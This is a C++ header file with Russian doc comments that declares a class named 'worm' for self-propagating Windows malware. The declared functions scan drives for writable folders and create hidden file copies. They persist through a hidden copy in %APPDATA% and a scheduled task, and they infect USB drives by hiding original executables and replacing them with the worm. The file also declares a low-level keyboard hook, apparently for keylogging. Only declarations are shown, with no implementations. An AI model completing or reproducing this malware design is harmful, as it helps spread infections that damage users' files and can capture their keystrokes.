#pragma once
#include <windows.h>
#include <shlobj.h>    ///< Для SHGetFolderPathW и констант CSIDL
#include <dbt.h>       ///< Для мониторинга устройств (DBT_...)
#include <string>
#include <vector>
#include <filesystem>
#include <fstream>

/**
 * @class worm
 * @brief Класс, реализующий логику самораспространения и системного мониторинга.
 * * Обеспечивает рекурсивное сканирование директорий, создание скрытых копий файлов,
 * механизмы закрепления в системе и отслеживание USB-накопителей.
 */
class worm
{
private:
    std::wstring path_to_start;                    ///< Начальная директория для сканирования.
    std::vector<std::wstring> list_dir;            ///< Список найденных доступных директорий.
    std::vector<std::filesystem::path> file_to_copy; ///< Список файлов, подготовленных для репликации.
    int iteration;                                 ///< Количество создаваемых копий на один файл.
    std::vector<std::filesystem::path> exe_on_the_flash_drive; ///< Список найденных исполняемых файлов на внешних носителях.

public:

    /** @name Системный мониторинг */
    /**@{*/
    static worm* instance; ///< Статический указатель на экземпляр для доступа из Callback-функций Windows.
    
    /**
     * @brief Запускает цикл мониторинга системных сообщений (подключение устройств).
     * @param hInstance Дескриптор экземпляра приложения.
     * @return Код завершения сообщения.
     */
    int run_device_monitor(HINSTANCE hInstance);
    /**@}*/

    /** @name Логика распространения */
    /**@{*/
    void scan_all_volumes();    ///< Сканирует все локальные диски типа DRIVE_FIXED.
    
    /** @brief Перегрузка для поиска директорий (использует внутренние поля класса). */
    void search_list_dir();

    /**
     * @brief Рекурсивный поиск директорий, доступных для записи.
     * @param path Путь для начала поиска.
     * @param dirs Вектор, в который будут записаны найденные пути.
     */
    void search_list_dir(const std::wstring& path, std::vector<std::wstring>& dirs);
    
    /** @brief Перегрузка для сбора файлов (использует внутренние поля класса). */
    void collect_visible_files();

    /**
     * @brief Сбор списка файлов из указанных директорий для последующего копирования.
     * @param dirs Список директорий для поиска.
     * @param files Выходной вектор с путями к файлам.
     */
    void collect_visible_files(const std::vector<std::wstring>& dirs, std::vector<std::filesystem::path>& files);
    
    /** @brief Перегрузка для репликации (использует значение iteration из класса). */
    void replicate_files();

    /**
     * @brief Создает скрытые копии собранных файлов.
     * @param count Количество копий.
     */
    void replicate_files(int count);

    void print_list_dir();      ///< Вывод списка найденных директорий в консоль.
    void print_file_to_copy();  ///< Вывод списка файлов для копирования в консоль.
    /**@}*/

    /** @name Закрепление в системе */
    /**@{*/
    void copy_and_hide_worm();  ///< Копирует исполняемый файл червя в директорию %APPDATA% и скрывает его.
    
    /**
     * @brief Создает задачу в планировщике Windows для автоматического запуска.
     * @param worm_path Полный путь к исполняемому файлу червя.
     */
    void create_scheduled_task(const std::wstring& worm_path);
    /**@}*/

    /** @name Работа со съемными носителями */
    /**@{*/
    void process_all_removable_disks(); ///< Сканирует и заражает все подключенные флеш-накопители.
    
    /**
     * @brief Скрывает оригинальный EXE файл на флешке и подменяет его телом червя.
     * @param target_exe Путь к целевому файлу.
     * @param worm_path Путь к исполняемому файлу червя.
     */
    void hide_and_replace_exe(const std::filesystem::path& target_exe, const std::wstring& worm_path);
    /**@}*/

    /** @name Вспомогательные проверки */
    /**@{*/
    bool possible_to_write(const std::wstring& dir_path); ///< Проверяет наличие прав на запись в директорию.
    bool dir_was_infected(const std::wstring& dir_path);  ///< Проверяет наличие маркера заражения в папке.
    bool is_system_path(const std::wstring& path);       ///< Проверяет, является ли путь системным (Windows, Program Files).
    
    void worm_was_started(); ///< Логирование начала работы червя.
    void worm_was_end();     ///< Логирование завершения работы или критической ошибки.

    /**
     * @brief Создает маркер заражения в указанной директории.
     * @param path Путь к папке для установки маркера.
     */
    void infected_dir(const std::wstring& path); 
    

    /** @brief Обработчик хука клавиатуры (LL) */
    static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    static HHOOK keyboardHook; ///< Дескриптор хука клавиатуры.
};